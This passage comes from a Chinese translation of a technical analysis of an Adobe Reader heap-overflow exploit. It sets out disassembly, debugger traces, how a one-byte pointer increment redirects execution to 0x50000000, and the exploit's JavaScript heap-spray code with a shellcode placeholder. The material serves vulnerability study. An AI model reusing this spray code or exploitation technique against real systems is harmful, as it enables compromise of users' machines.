
```
.text:009D7884                 mov     esi, edi        ; edi is v\_counter
.text:009D7886                 sar     esi, 3          ; v\_counter/8
.text:009D7889                 add     esi, \[esp+1Ch+lp\_original\_stream\] ; pass how many bytes
.text:009D788D                 mov     ecx, edi
.text:009D788F                 movzx   edx, byte ptr \[esi\] ; read next byte
.text:009D7892                 and     ecx, 7      ; pass how many bits in the next byte
.text:009D7895                 mov     eax, 8
.text:009D789A                 sub     eax, ecx
.text:009D789C                 sub     eax, ebp        ; ebp is always 1
.text:009D789E                 mov     cl, al
.text:009D78A0                 shr     edx, cl      ; set the lowest bit as the corresponding bit
.text:009D78A2                 and     edx, \[esp+1Ch+var\_8\] ; var\_8 is always 1, so corresponding bit is the DWORD value
.text:009D78A6                 cmp     \[esp+1Ch+arg\_C\], 0 ; arg\_C is always 0
.text:009D78AC                 jz      short loc\_9D78BC ; jump



.text:009D78BC loc\_9D78BC:                             ; CODE XREF: sub\_9D7850+5Cj
.text:009D78BC                 mov     ecx, \[esp+1Ch+arg\_10\]; get the old\_DWORD
.text:009D78C0                 add     ecx, edx        ; new\_DWORD = old\_DWORD + corresponding-bit
.text:009D78C2                 mov     edx, ecx
.text:009D78C4
.text:009D78C4 loc\_9D78C4:                             ; CODE XREF: sub\_9D7850+6Aj
.text:009D78C4                 and     dl, \[esp+1Ch+var\_9\]
.text:009D78C8                 add     edi, \[esp+1Ch+arg\_8\]
.text:009D78CC                 mov     \[esp+1Ch+arg\_10\], ecx   ; save the new\_DWORD

.text:009D78E5                 mov     eax, \[esp+18h+arg\_10\]   ; return the new\_DWORD

```

简而言之，函数使用计数器的当前值在解码流中检索一个比特 `Bit`, 如前所述，我们认为缓冲区的每个对象在比特流中存在一个相对应的比特，我们称之为 `corresponding_bit` `对应比特,译者注`。

这个比特会转换成一个 `DWORD` 并且加上之前的 `DWORD` `表现为一个对象` 被处理：

`new_DWORD = old_DWORD + corresponding_bit`

理所当然的是 `corresponding_bit` 只能是 `1` 或者 `0`。因此 `new_DWORD` 不能被设置为任意值：要么不变，要么以 `1` 递增。这就是攻击者通过比特流所能控制的所有东西。

现在原来的流为 `'00 00 20 00 00 00 10'`, 并且流中只有 `0x12` 和 `0x33` 被设置为 `1`, 因此只有 `2` 个 `DWORDs` 在 `0x12` 和 `0x33` 处会递增。

对应的 `0x80` 长度的堆块的结尾，这些 `DWORDs` 在如下偏移：

`offset1 = 0x12*4 + 0x44 - 0x80 = 0x0C`

`offset2 = 0x33*4 + 0x44 - 0x80 = 0x90`

这与在第一部分观察到的内容相匹配，但是这两个 `DWORDs` 是什么，而且为什么要递增呢？

## 2.2 控制程序执行流程

经过多次试验后，对内存的情况了然于胸，这 `2` 个 `DWORDs` 的其中之一好像是一个指针。这个指针会指向一段不断变化的内存地址的一个 `C` 语言结构。

当 `Adobe Reader` 在解析 `PDF` 页面时会使用到这个结构。多数情况下，第二个指针 `offset2,0x90` 会指向这个结构。下面给出一个例子：

首先，我们检验在溢出触发时偏移 `0x90` 处的指针递增：

代码:
```
Breakpoint 0 hit
eax=02008b1c ebx=00000001 ecx=0012ed54 edx=0438afcb esi=0438af18 edi=0012eea0
eip=009f7868 esp=0012ed3c ebp=0438afcb iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
AcroRd32!AVAcroALM\_IsFeatureEnabled+0x63e09:
009f7868 e863060000      call    AcroRd32!AVAcroALM\_IsFeatureEnabled+0x64471 (009f7ed0)
0:000> dd esp
0012ed3c  0012ed54 0438af18 02008b1c 00000000
0012ed4c  0210b734 01f2b424 0438afcb 00a8da8e 
0:000> dd 02008b1c+80+90
02008c2c  <b>0124da40</b> 00000544 0017ee98 ffffffff
02008c3c  00000000 00000000 00000000 00000000

Breakpoint 1 hit
eax=00000000 ebx=00000001 ecx=00000038 edx=00000000 esi=0438af18 edi=0012eea0
eip=009f786d esp=0012ed3c ebp=0438afcb iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
AcroRd32!AVAcroALM\_IsFeatureEnabled+0x63e0e:
009f786d 83c40c          add     esp,0Ch
0:000> dd 02008b1c+80+90
02008c2c  <b>0124da41</b> 00000544 0017ee98 ffffffff
02008c3c  00000000 00000000 00000000 00000000

```

溢出之前，此结构的指针为 `0x0124da40`, 溢出之后，变成了 `0x0124da41`。

接下来的图片显示出当溢出发生后结构如何访问：

![](img/1e9f09ab1ffd967d0b28ba5258447b50.jpg)

图 4：进入 ShellCode

首先，结构的地址赋给 `EAX`。接着这个结构的第一个 `DWORD` 值被读取。如果这个值大于 `0x90`, 会接着读取存储在偏移 `0x90` 的值 `[*+0x90]`, 译者注 `实际上是这个结构的开始处`：偏移处的值作为一个函数的指针读取并赋给 `EAX`。最终，如果函数指针不为空，就回跳入这个函数执行 `Call EAX` 译者注。

因此，攻击者真正的目标是改变这个结构偏移 `0x90` 处的函数指针的值 `注意：结构的指针和堆块使用同样的 0x90` 处的偏移，这仅仅是个巧合`。这样改变了函数的指针就获得对执行流程的控制。做到如此，攻击者只能递增这个结构的指针 `通过比特流，不明白查看之前的几节`，因此通过一个字节就改变了这个结构的整个值。他不能设置结构的指针为任意值，这个漏洞利用开发是相当取巧的。

这可以从对在正常和攻击 `换言之就是漏洞利用被触发时` 情况下的内存状态进行比较得出。转储这个结构在正常状态下的结果为：

代码:
```
0:000> dd 0124da40
0124da40  0000010c 00965450 00968cc0 00aae890
0124da50  01021e10 01024380 01021e40 01024430
0124da60  009671c0 010243e0 00971670 01022e80
0124da70  00a468c0 00970d10 0096f060 00964e80
0124da80  0096f7d0 0096fe30 00961ca0 0095c060
0124da90  010228e0 00000000 00000000 00000000
0124daa0  00000000 00000000 00000000 00000000
0124dab0  00000000 00960420 00000000 00000000
0124dac0  0099f2e0 00970750 009712d0 00971420
0124dad0  00000000 00a03950 00a1ced0 01022c10
0124dae0  01022cc0 01022d40 00000000 00000000

```

正常情况：尽管 `0x1c` 大于 `0x90`, 因函数在偏移 `0x90(0x012dad0)` 处的指针为 `0`, 什么都不会发生。

但是在攻击状态下，溢出发生后 `请注意当字节改变时结尾处的变化`：

代码:
```
0:000> dd 0124da41
0124da41  50000001 c0009654 9000968c 1000aae8
0124da51  8001021e 40010243 3001021e c0010244
0124da61  e0009671 70010243 80009716 c001022e
0124da71  1000a468 6000970d 800096f0 d000964e
0124da81  300096f7 a00096fe 6000961c e00095c0
0124da91  00010228 00000000 00000000 00000000
0124daa1  00000000 00000000 00000000 00000000
0124dab1  20000000 00009604 00000000 e0000000
0124dac1  500099f2 d0009707 20009712 00009714
0124dad1  50000000 d000a039 1000a1ce c001022c
0124dae1  4001022c 0001022d 00000000 00000000

```

因为 `0x50000001` 大于 `0x90`, 并且 `0x50000000` 不为 `0`, 程序流程会被转换到 `0x5000000`。

应当指出。有时指针 `1` `偏移 0x0c 相对于 0x80` 长度堆块的结尾`会指向这个结构，这就是为什么攻击者很容易的递增指针。

攻击者不能改变任意其他的 `DWORDs` 值，因为改变这两个的最低限度是使漏洞利用得以运行。改变任意其他 `DWORDs` 很有可能导致应用程序在控制 `EIP` 之前就挂掉。

## 2.3 堆喷射

如上所述，攻击者并不能精确的控制函数指针最终跳往的地点，他只能使它指向 `0x50000000` 这个地址，幸运的是，这里通常属于堆，因此使用 `ShellCode` 填充堆有助于确保恶意代码最终从 `0x50000000` 处开始执行。

这里是用经典的 `JavaScript` 堆填充代码实现的。`图 5` `这里以文字给出，译者注`

代码:
```
function urpl(sc){
var keyu= "%u";
var re = /XX/g;
sc = sc.replace(re,keyu);
return sc;
}
function xxsc(sc){
var sprdataxx = "XX9090XX9090";
var esprpl=unescape;
var urpled = esprpl(urpl(sc));
var blknum = 0x41000;
var sprdata = esprpl(urpl(sprdataxx));

while(sprdata.length<blknum)
    sprdata+=sprdata;
sprblk=sprdata.substring(0,sprdata.length);
scblk=urpled.substring(0,urpled.length);
memory=new Array();
for(x=0;x<1700;x++)
    memory\[x\]=sprblk+scblk;
}
var s = "XXec81XX(此处为 ShellCode)
var a=app.viewerVersion;
if (a >= 9) xxsc(s);
else while(1){};

```

图 5: 用作填充物理内存的解码过的 `JavaScript`。

## 2.4 击溃 Adobe 的堆内存管理系统

为什么使用 `0x80` 作为分配的的伪造堆块长度？换句话说，为什么选择 `0x4000000E` 作为参数 `X` 的值？

一般来说，在 `Windows` 系列系统中堆内存的分配最终会调用系统级 `API RtlAllocateHeap` 来申请分配堆块。在这样一个情况下，对应用程序来说内存块的返回值是不确定的。

但是，`Adobe Reader` 有着自身的堆管理例程，如果堆块的长度小于或者等于 `0x80` 个字节，请求就不会提交到系统级的堆管理例程，与之对应的，`Adobe Reader` 自身的内存管理例程会寻找一个适当的循环通过比较被请求的分配大小。

接下来就是在 `Acrod32.dll` 中函数 `acro_allocate_routine` 的有关代码：

代码:
